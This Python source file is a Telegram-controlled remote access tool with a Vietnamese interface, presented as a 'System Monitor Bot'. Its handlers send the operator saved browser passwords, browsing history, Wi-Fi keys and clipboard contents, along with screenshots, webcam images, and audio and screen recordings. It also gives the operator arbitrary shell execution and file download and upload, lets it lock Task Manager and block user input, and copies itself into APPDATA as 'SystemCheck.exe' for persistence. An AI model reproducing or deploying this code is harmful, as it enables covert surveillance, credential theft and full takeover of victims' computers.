"""
V10 - System Monitor Bot 

Main entry point with modular architecture

Developer: TsByin
Version: 2.0 (Refactored & Optimized)
"""

import sys
import os
import time
import threading
import logging
import socket
import platform
import subprocess
import psutil
from datetime import datetime
from telebot import TeleBot, types

# Import our modules
from config import (
    API_TOKEN, ADMIN_ID, BASE_DIR, BLOCKED_FILE, SETTINGS_FILE,
    BROWSER_PATHS, MAX_WORKERS, logger, AUDIO_AVAILABLE, TTS_AVAILABLE,
    MONITOR_INTERVAL, CPU_ALERT_THRESHOLD, CPU_ALERT_COOLDOWN
)

from utils import (
    load_settings, save_settings, load_blocked_list, save_blocked_list,
    get_active_window_title, find_and_close_window, show_message_box,
    speak_text, get_installed_browsers, set_taskmgr_state, check_integrity,
    protect_folder, load_json_safe, save_json_safe
)

from grabber import (
    grab_passwords, grab_history_specific, grab_wifi_passwords, save_wifi_to_file
)

from media import (
    smart_screenshot, capture_webcam, record_audio, record_screen,
    get_media_file_size, cleanup_media_file
)

from monitor import SystemMonitor, BotStats

# ==============================================================================
# GLOBAL STATE
# ==============================================================================

config = {
    'MONITOR_INTERVAL': MONITOR_INTERVAL,
    'CPU_ALERT_THRESHOLD': CPU_ALERT_THRESHOLD,
    'CPU_ALERT_COOLDOWN': CPU_ALERT_COOLDOWN,
}

bot = TeleBot(API_TOKEN)
bot_stats = BotStats()
monitor = None
upload_state = {}

# State variables
intrusion_alert_active = False
block_mode_active = False
taskmgr_locked = False

# Load data
BLOCKED_DATA = load_blocked_list(BLOCKED_FILE)
CURRENT_SETTINGS = load_settings(SETTINGS_FILE)

logger.info(f"✅ Bot initialized for Admin: {ADMIN_ID}")

# ==============================================================================
# BOT MENUS
# ==============================================================================

def send_reply_menu(m):
    """Send Reply Keyboard Menu"""
    mk = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    mk.add("🔑 Lấy Passwords", "🌐 Lịch Sử Web")
    mk.add("🖼 Chụp Màn Hình", "📸 Webcam")
    mk.add("🎤 Ghi Âm (10s)", "🎥 Quay MH (10s)")
    mk.add("🚫 Chặn App/Web", "🔒 Khóa TaskMgr")
    mk.add("⚙️ QL Tiến Trình", "🚀 Chạy Lệnh")
    mk.add("🔄 Khởi động lại", "🛑 Tắt máy")
    mk.add("📂 Duyệt File", "🚨 Cảnh Báo (Toggle)")
    mk.add("📶 Wi-Fi", "📋 Clipboard")
    mk.add("📍 Vị Trí IP", "🧱 Khóa Input")
    mk.add("💓 Kiểm Tra Bot")
    
    bot.send_message(m.chat.id, "🛡️ **MENU 1 (Bàn Phím)**", reply_markup=mk, parse_mode="Markdown")

def send_inline_menu(m):
    """Send Inline Keyboard Menu"""
    mk = types.InlineKeyboardMarkup(row_width=2)
    btns = [
        types.InlineKeyboardButton("🔑 Passwords", callback_data="cmd_pass"),
        types.InlineKeyboardButton("🌐 History", callback_data="cmd_hist"),
        types.InlineKeyboardButton("🖼 Screen", callback_data="cmd_scr"),
        types.InlineKeyboardButton("📸 Webcam", callback_data="cmd_cam"),
        types.InlineKeyboardButton("🎤 Audio", callback_data="cmd_aud"),
        types.InlineKeyboardButton("🎥 Video", callback_data="cmd_vid"),
        types.InlineKeyboardButton("🚫 Block", callback_data="cmd_block_toggle"),
        types.InlineKeyboardButton("🔒 TaskMgr", callback_data="cmd_task"),
        types.InlineKeyboardButton("⚙️ Process", callback_data="cmd_proc"),
        types.InlineKeyboardButton("🚀 Shell", callback_data="cmd_shell"),
        types.InlineKeyboardButton("🔄 Restart", callback_data="cmd_res"),
        types.InlineKeyboardButton("🛑 Off", callback_data="cmd_off"),
        types.InlineKeyboardButton("📂 Files", callback_data="cmd_file"),
        types.InlineKeyboardButton("🚨 Alert", callback_data="cmd_alert"),
        types.InlineKeyboardButton("📶 Wifi", callback_data="cmd_wifi"),
        types.InlineKeyboardButton("📋 Clip", callback_data="cmd_clip"),
        types.InlineKeyboardButton("📦 Apps", callback_data="cmd_apps"),
        types.InlineKeyboardButton("📍 IP Info", callback_data="cmd_ip"),
        types.InlineKeyboardButton("🧱 Lock Input", callback_data="cmd_input"),
        types.InlineKeyboardButton("💓 Check Bot", callback_data="cmd_ping")
    ]
    mk.add(*btns)
    
    bot.send_message(m.chat.id, "🛡️ **MENU 2 (Nút Bấm)**", reply_markup=mk, parse_mode="Markdown")

# ==============================================================================
# COMMAND HANDLERS
# ==============================================================================

@bot.message_handler(commands=['start', 'menu'])
def menu_handler(m):
    """Handle /start and /menu commands"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        args = m.text.split()
        if len(args) > 1:
            if args[1] == '1':
                save_settings(SETTINGS_FILE, 1)
                send_reply_menu(m)
            elif args[1] == '2':
                save_settings(SETTINGS_FILE, 2)
                send_inline_menu(m)
            else:
                bot.reply_to(m, "Dùng: /menu 1 hoặc /menu 2")
        else:
            # Load saved menu state
            if CURRENT_SETTINGS["menu_mode"] == 1:
                send_reply_menu(m)
            else:
                send_inline_menu(m)
    except Exception as e:
        logger.error(f"menu_handler failed: {e}")

@bot.message_handler(commands=['help'])
def help_handler(m):
    """Help command"""
    if m.from_user.id != ADMIN_ID:
        return
    
    text = (
        "ℹ️ **LỆNH:**\n"
        "/block app <tên.exe>\n"
        "/block site <domain>\n"
        "/unblock app/site <tên>\n"
        "/say <text>\n"
        "/msg <text>\n"
        "/kill <pid>\n"
        "/stats"
    )
    bot.send_message(m.chat.id, text, parse_mode="Markdown")

# ==============================================================================
# STATUS & STATS
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "💓 Kiểm Tra Bot")
def check_status(m):
    """Check bot status"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        curr_menu = "1 (Bàn Phím)" if CURRENT_SETTINGS["menu_mode"] == 1 else "2 (Nút Bấm)"
        
        msg = (
            f"🟢 **ONLINE**\n"
            f"⏱ Uptime: {bot_stats.get_stats()['uptime']}\n"
            f"💻 Host: {socket.gethostname()}\n"
            f"🧠 CPU: {bot_stats.get_stats()['cpu']}% | "
            f"💾 RAM: {bot_stats.get_stats()['ram']}%\n"
            f"🔒 TaskMgr: {'LOCKED' if taskmgr_locked else 'OPEN'}\n"
            f"📱 Menu: {curr_menu}"
        )
        bot.reply_to(m, msg, parse_mode="Markdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"check_status failed: {e}")
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(commands=['stats'])
def show_stats(m):
    """Show detailed statistics"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        msg = bot_stats.get_stats_message()
        bot.send_message(m.chat.id, msg, parse_mode="Markdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"show_stats failed: {e}")

# ==============================================================================
# PASSWORD & HISTORY
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "🔑 Lấy Passwords")
def h_pass(m):
    """Extract and send passwords"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "⏳ Đang trích xuất mật khẩu...")
            outfile = grab_passwords(BROWSER_PATHS, compress=True, max_workers=MAX_WORKERS)
            
            if outfile:
                with open(outfile, 'rb') as f:
                    bot.send_document(m.chat.id, f)
                
                cleanup_media_file(outfile)
                bot_stats.increment_command()
                bot_stats.add_data_captured(get_media_file_size(outfile))
                logger.info("Passwords sent successfully")
            else:
                bot.send_message(m.chat.id, "❌ Không tìm thấy mật khẩu")
        except Exception as e:
            logger.error(f"h_pass failed: {e}")
            bot.send_message(m.chat.id, f"❌ Lỗi: {e}")
    
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "🌐 Lịch Sử Web")
def task_history_menu(m):
    """History browser selection menu"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        installed = get_installed_browsers(BROWSER_PATHS)
        mk = types.InlineKeyboardMarkup()
        
        for b in installed:
            mk.add(types.InlineKeyboardButton(f"🌐 {b}", callback_data=f"hist_sel|{b}"))
        
        bot.send_message(m.chat.id, "👇 Chọn trình duyệt:", reply_markup=mk)
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"task_history_menu failed: {e}")

# ==============================================================================
# MEDIA CAPTURE
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "🖼 Chụp Màn Hình")
def h_scr(m):
    """Screenshot"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        img_data = smart_screenshot()
        if img_data:
            bot.send_photo(m.chat.id, img_data)
            bot_stats.increment_command()
        else:
            bot.send_message(m.chat.id, "❌ Lỗi chụp màn hình")
    except Exception as e:
        logger.error(f"h_scr failed: {e}")

@bot.message_handler(func=lambda m: m.text == "📸 Webcam")
def h_cam(m):
    """Webcam capture"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        # Temporarily disable intrusion alert if active
        global intrusion_alert_active
        wa = intrusion_alert_active
        if wa:
            intrusion_alert_active = False
            time.sleep(1)
        
        img_data = capture_webcam()
        if img_data:
            bot.send_photo(m.chat.id, img_data)
            bot_stats.increment_command()
        else:
            bot.send_message(m.chat.id, "❌ Lỗi webcam")
        
        if wa:
            intrusion_alert_active = True
    except Exception as e:
        logger.error(f"h_cam failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🎤 Ghi Âm (10s)")
def h_aud(m):
    """Record audio"""
    if m.from_user.id != ADMIN_ID:
        return
    
    if not AUDIO_AVAILABLE:
        bot.send_message(m.chat.id, "❌ Thiếu Audio Driver")
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "🎙 Ghi âm...")
            if record_audio(10, "rec.wav"):
                with open("rec.wav", 'rb') as f:
                    bot.send_voice(m.chat.id, f)
                cleanup_media_file("rec.wav")
                bot_stats.increment_command()
            else:
                bot.send_message(m.chat.id, "❌ Lỗi ghi âm")
        except Exception as e:
            logger.error(f"h_aud task failed: {e}")
    
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "🎥 Quay MH (10s)")
def h_vid(m):
    """Record screen"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "🎥 Quay video...")
            if record_screen(10, "screen.avi"):
                with open("screen.avi", 'rb') as f:
                    bot.send_document(m.chat.id, f)
                cleanup_media_file("screen.avi")
                bot_stats.increment_command()
            else:
                bot.send_message(m.chat.id, "❌ Lỗi quay video")
        except Exception as e:
            logger.error(f"h_vid task failed: {e}")
    
    threading.Thread(target=task, daemon=True).start()

# ==============================================================================
# BLOCKING & CONTROL
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "🚫 Chặn App/Web")
def toggle_block(m):
    """Toggle blocking mode"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        global block_mode_active
        block_mode_active = not block_mode_active
        
        status = "🟢 BẬT" if block_mode_active else "🔴 TẮT"
        bot.send_message(m.chat.id, f"🛡️ Chế độ Chặn: {status}")
        bot_stats.increment_command()
        logger.info(f"Block mode toggled: {block_mode_active}")
    except Exception as e:
        logger.error(f"toggle_block failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🔒 Khóa TaskMgr")
def toggle_taskmgr(m):
    """Toggle TaskMgr lock"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        global taskmgr_locked
        taskmgr_locked = not taskmgr_locked
        set_taskmgr_state(enable=not taskmgr_locked)
        
        status = "🔴 ĐÃ KHÓA" if taskmgr_locked else "🟢 ĐÃ MỞ"
        bot.send_message(m.chat.id, f"🛡️ Task Manager: {status}")
        bot_stats.increment_command()
        logger.info(f"TaskMgr locked: {taskmgr_locked}")
    except Exception as e:
        logger.error(f"toggle_taskmgr failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🚨 Cảnh Báo (Toggle)")
def h_alert(m):
    """Toggle intrusion alert"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        global intrusion_alert_active
        intrusion_alert_active = not intrusion_alert_active
        
        status = "BẬT" if intrusion_alert_active else "TẮT"
        bot.send_message(m.chat.id, f"🚨 Cảnh báo xâm nhập: {status}")
        bot_stats.increment_command()
        logger.info(f"Intrusion alert toggled: {intrusion_alert_active}")
    except Exception as e:
        logger.error(f"h_alert failed: {e}")

# ==============================================================================
# FILE BROWSER
# ==============================================================================

def list_dir(cid, path):
    """List directory contents"""
    mk = types.InlineKeyboardMarkup()
    
    try:
        items = os.listdir(path)
        mk.add(types.InlineKeyboardButton("🔙 Lên", callback_data=f"d|{os.path.dirname(path)}"))
        mk.add(types.InlineKeyboardButton("⬇️ Tải file lên đây", callback_data=f"up|{path}"))
        
        for i in items[:8]:
            p = os.path.join(path, i)
            if os.path.isdir(p):
                mk.add(types.InlineKeyboardButton(f"📁 {i}", callback_data=f"d|{p}"))
            else:
                mk.add(types.InlineKeyboardButton(f"📄 {i}", callback_data=f"f|{p}"))
        
        bot.send_message(cid, f"📂 {path}", reply_markup=mk)
    except Exception as e:
        logger.error(f"list_dir failed: {e}")
        bot.send_message(cid, f"❌ Lỗi: {e}")

@bot.message_handler(func=lambda m: m.text == "📂 Duyệt File")
def h_exp(m):
    """File explorer"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        list_dir(m.chat.id, "C:\\")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_exp failed: {e}")

# ==============================================================================
# SYSTEM COMMANDS
# ==============================================================================

@bot.message_handler(commands=['kill'])
def cmd_kill(m):
    """Kill process by PID"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        pid = int(m.text.split()[1])
        psutil.Process(pid).terminate()
        bot.reply_to(m, f"✅ Terminated PID {pid}")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"cmd_kill failed: {e}")
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(commands=['cmd'])
def run_shell(m):
    """Execute shell command"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        cmd = m.text[5:]
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        output = result.decode('cp850', errors='ignore')
        
        bot.reply_to(m, f"```\n{output[:4000]}\n```", parse_mode="Markdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"run_shell failed: {e}")
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(func=lambda m: m.text == "⚙️ QL Tiến Trình")
def h_proc(m):
    """Show top processes"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        p_list = sorted(
            [p.info for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])],
            key=lambda x: x['cpu_percent'],
            reverse=True
        )[:15]
        
        msg = "⚙️ **TOP 15 PROCESS**\n"
        msg += "\n".join([f"`{p['pid']}` {p['name']} ({p['cpu_percent']}%)" for p in p_list])
        msg += "\n\n/kill <pid> tắt"
        
        bot.send_message(m.chat.id, msg, parse_mode="Markdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_proc failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🔄 Khởi động lại")
def h_res(m):
    """Reboot system"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        os.system("shutdown /r /t 5")
        bot.send_message(m.chat.id, "🔄 Khởi động lại trong 5 giây...")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_res failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🛑 Tắt máy")
def h_off(m):
    """Shutdown system"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        os.system("shutdown /s /t 5")
        bot.send_message(m.chat.id, "🛑 Tắt máy trong 5 giây...")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_off failed: {e}")

@bot.message_handler(commands=['say'])
def h_say(m):
    """Text-to-speech"""
    if m.from_user.id != ADMIN_ID:
        return
    
    if not TTS_AVAILABLE:
        bot.reply_to(m, "❌ TTS not available")
        return
    
    def task():
        try:
            text = m.text[5:]
            speak_text(text)
            bot_stats.increment_command()
        except Exception as e:
            logger.error(f"h_say task failed: {e}")
    
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(commands=['msg'])
def h_msg(m):
    """Show message box"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            text = m.text[5:]
            show_message_box(text)
            bot_stats.increment_command()
        except Exception as e:
            logger.error(f"h_msg task failed: {e}")
    
    threading.Thread(target=task, daemon=True).start()

# ==============================================================================
# WIFI & UTILITIES
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "📶 Wi-Fi")
def h_wifi(m):
    """Get WiFi passwords"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "⏳ Đang trích xuất WiFi...")
            wifi_data = grab_wifi_passwords()
            
            if wifi_data:
                outfile = save_wifi_to_file(wifi_data)
                with open(outfile, 'rb') as f:
                    bot.send_document(m.chat.id, f)
                cleanup_media_file(outfile)
                bot_stats.increment_command()
            else:
                bot.send_message(m.chat.id, "❌ Không tìm thấy WiFi")
        except Exception as e:
            logger.error(f"h_wifi task failed: {e}")
            bot.send_message(m.chat.id, f"❌ Lỗi: {e}")
    
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "📋 Clipboard")
def h_clip(m):
    """Get clipboard"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        import pyperclip
        clip_text = pyperclip.paste()
        bot.send_message(m.chat.id, f"📋 **Clip:**\n`{clip_text[:2000]}`", parse_mode="Markdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_clip failed: {e}")

@bot.message_handler(func=lambda m: m.text == "📍 Vị Trí IP")
def h_loc(m):
    """Get IP location"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        import requests
        r = requests.get("http://ip-api.com/json/", timeout=5).json()
        bot.send_message(m.chat.id, f"🌍 IP: {r['query']}\nTP: {r['city']}\nISP: {r['isp']}")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_loc failed: {e}")
        bot.send_message(m.chat.id, "❌ Lỗi IP")

@bot.message_handler(func=lambda m: m.text == "🧱 Khóa Input")
def h_blockinput(m):
    """Lock input"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            import ctypes
            bot.send_message(m.chat.id, "🧱 Đang khóa 10s...")
            ctypes.windll.user32.BlockInput(True)
            time.sleep(10)
            ctypes.windll.user32.BlockInput(False)
            bot.send_message(m.chat.id, "🔓 Mở")
            bot_stats.increment_command()
        except Exception as e:
            logger.error(f"h_blockinput task failed: {e}")
    
    threading.Thread(target=task, daemon=True).start()

# ==============================================================================
# BLOCKING MANAGEMENT
# ==============================================================================

@bot.message_handler(commands=['block', 'unblock'])
def block_mgr(m):
    """Manage blocked apps/sites"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        parts = m.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.reply_to(m, "❌ Sai cú pháp")
            return
        
        cmd, type_, target = parts[0], parts[1], parts[2].lower()
        key = "apps" if type_ == "app" else "sites"
        
        if cmd == "/block":
            if target not in BLOCKED_DATA[key]:
                BLOCKED_DATA[key].append(target)
                save_blocked_list(BLOCKED_FILE, BLOCKED_DATA)
                bot.reply_to(m, f"✅ Đã chặn {target}")
                logger.info(f"Blocked {target}")
            else:
                bot.reply_to(m, "⚠️ Đã có")
        else:  # unblock
            if target in BLOCKED_DATA[key]:
                BLOCKED_DATA[key].remove(target)
                save_blocked_list(BLOCKED_FILE, BLOCKED_DATA)
                bot.reply_to(m, f"🗑 Đã xóa {target}")
                logger.info(f"Unblocked {target}")
            else:
                bot.reply_to(m, "⚠️ Không thấy")
        
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"block_mgr failed: {e}")
        bot.reply_to(m, f"❌ Lỗi: {e}")

# ==============================================================================
# CALLBACK HANDLER
# ==============================================================================

CALLBACK_MAP = {
    "cmd_pass": h_pass,
    "cmd_hist": task_history_menu,
    "cmd_scr": h_scr,
    "cmd_cam": h_cam,
    "cmd_aud": h_aud,
    "cmd_vid": h_vid,
    "cmd_block_toggle": toggle_block,
    "cmd_task": toggle_taskmgr,
    "cmd_proc": h_proc,
    "cmd_shell": lambda m: bot.send_message(m.chat.id, "Gõ: `/cmd <lệnh>`", parse_mode="Markdown"),
    "cmd_res": h_res,
    "cmd_off": h_off,
    "cmd_file": h_exp,
    "cmd_alert": h_alert,
    "cmd_wifi": h_wifi,
    "cmd_clip": h_clip,
    "cmd_apps": lambda m: bot.send_message(m.chat.id, "📦 Feature coming soon"),
    "cmd_ip": h_loc,
    "cmd_input": h_blockinput,
    "cmd_ping": check_status,
}

@bot.callback_query_handler(func=lambda c: c.from_user.id == ADMIN_ID)
def cb_handler(c):
    """Unified callback handler"""
    data = c.data
    msg = c.message
    cid = msg.chat.id
    
    try:
        logger.info(f"Callback received: {data}")
        
        # Check direct callbacks
        if data in CALLBACK_MAP:
            bot.answer_callback_query(c.id, "⏳ Đang xử lý...")
            handler = CALLBACK_MAP[data]
            
            # Run handler in thread to avoid blocking
            def run_handler():
                try:
                    handler(msg)
                    logger.info(f"Callback {data} executed successfully")
                except Exception as e:
                    logger.error(f"Callback {data} failed: {e}", exc_info=True)
                    bot.send_message(cid, f"❌ Lỗi thực thi: {e}")
            
            threading.Thread(target=run_handler, daemon=True).start()
        
        # History selection
        elif data.startswith("hist_sel|"):
            browser = data.split("|")[1]
            mk = types.InlineKeyboardMarkup()
            for limit in [100, 500, 1000]:
                mk.add(types.InlineKeyboardButton(f"{limit} dòng", 
                                                  callback_data=f"hist_run|{browser}|{limit}"))
            bot.edit_message_text(f"🌐 {browser}: Chọn số lượng", 
                                 cid, msg.message_id, reply_markup=mk)
            bot.answer_callback_query(c.id, "✅")
        
        # History execution
        elif data.startswith("hist_run|"):
            _, browser, limit = data.split("|")
            bot.answer_callback_query(c.id, "Đang tải history...")
            
            def task():
                try:
                    outfile = grab_history_specific(BROWSER_PATHS, browser, int(limit))
                    if outfile:
                        with open(outfile, 'rb') as f:
                            bot.send_document(cid, f, 
                                            caption=f"History: {browser}")
                        cleanup_media_file(outfile)
                        bot_stats.increment_command()
                        logger.info(f"History sent: {browser}")
                    else:
                        bot.send_message(cid, f"❌ Không tìm được history")
                except Exception as e:
                    logger.error(f"History download failed: {e}", exc_info=True)
                    bot.send_message(cid, f"❌ Lỗi: {e}")
            
            threading.Thread(target=task, daemon=True).start()
        
        # Directory browse
        elif data.startswith("d|"):
            path = data.split("|", 1)[1]
            bot.answer_callback_query(c.id, "✅")
            try:
                bot.delete_message(cid, msg.message_id)
            except:
                pass
            list_dir(cid, path)
        
        # File download
        elif data.startswith("f|"):
            filepath = data.split("|", 1)[1]
            bot.answer_callback_query(c.id, "Đang tải file...")
            
            def download_task():
                try:
                    with open(filepath, 'rb') as f:
                        bot.send_document(cid, f)
                    logger.info(f"File sent: {filepath}")
                except Exception as e:
                    logger.error(f"File download failed: {e}", exc_info=True)
                    bot.send_message(cid, f"❌ Lỗi tải file: {e}")
            
            threading.Thread(target=download_task, daemon=True).start()
        
        # File upload
        elif data.startswith("up|"):
            target_path = data.split("|", 1)[1]
            upload_state[cid] = target_path
            bot.answer_callback_query(c.id, "✅")
            bot.send_message(cid, 
                            f"📤 Hãy gửi file (<20MB) để lưu vào: `{target_path}`", 
                            parse_mode="Markdown")
        
        else:
            logger.warning(f"Unknown callback: {data}")
            bot.answer_callback_query(c.id, "❌ Lệnh không nhận diện")
    
    except Exception as e:
        logger.error(f"Callback handler critical error: {e}", exc_info=True)
        try:
            bot.answer_callback_query(c.id, f"❌ Lỗi: {str(e)[:50]}")
        except:
            pass

@bot.message_handler(content_types=['document'])
def handle_upload(m):
    """Handle file upload"""
    if m.from_user.id != ADMIN_ID:
        return
    
    if m.chat.id not in upload_state:
        return
    
    try:
        if m.document.file_size / (1024 * 1024) > 19.5:
            bot.reply_to(m, "❌ File > 20MB")
            return
        
        target_dir = upload_state[m.chat.id]
        file_name = m.document.file_name
        
        bot.reply_to(m, "⏳ Đang tải...")
        file_info = bot.get_file(m.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        filepath = os.path.join(target_dir, file_name)
        with open(filepath, 'wb') as f:
            f.write(downloaded_file)
        
        bot.reply_to(m, f"✅ Đã lưu vào `{target_dir}`", parse_mode="Markdown")
        del upload_state[m.chat.id]
        bot_stats.increment_command()
        logger.info(f"File uploaded: {filepath}")
    
    except Exception as e:
        logger.error(f"File upload failed: {e}")
        bot.reply_to(m, f"❌ Lỗi: {e}")

# ==============================================================================
# MAIN
# ==============================================================================

if __name__ == "__main__":
    try:
        # Check persistence
        appdata = os.getenv('APPDATA')
        target_dir = os.path.join(appdata, "Microsoft", "Windows", "SystemMonitor")
        current_exe = sys.executable if getattr(sys, 'frozen', False) else __file__
        target_exe = os.path.join(target_dir, "SystemCheck.exe")
        
        check_integrity(target_dir, target_exe, current_exe)
        
        # Start monitor thread
        monitor = SystemMonitor(ADMIN_ID, bot, config)
        monitor_thread = threading.Thread(target=monitor.run, daemon=True)
        monitor_thread.start()
        
        logger.info(f"✅ Bot Started. ID: {ADMIN_ID}")
        logger.info(f"🟢 SYSTEM ONLINE | Host: {platform.node()}")
        
        try:
            bot.send_message(
                ADMIN_ID,
                f"🟢 **SYSTEM ONLINE**\n"
                f"Host: {platform.node()}\n"
                f"IP: {socket.gethostbyname(socket.gethostname())}",
                parse_mode="Markdown"
            )
        except:
            pass
        
        # Polling
        while True:
            try:
                bot.infinity_polling(timeout=10, long_polling_timeout=5)
            except Exception as e:
                logger.error(f"Polling error: {e}")
                time.sleep(5)
    
    except Exception as e:
        logger.critical(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)

# ═══════════════════════════════════════════════════════════════
# Developer: TsByin
# Project: V10 System Monitor Bot - Refactored & Optimized
# Version: 2.0 (Modular Architecture with Concurrent Operations)
# ═══════════════════════════════════════════════════════════════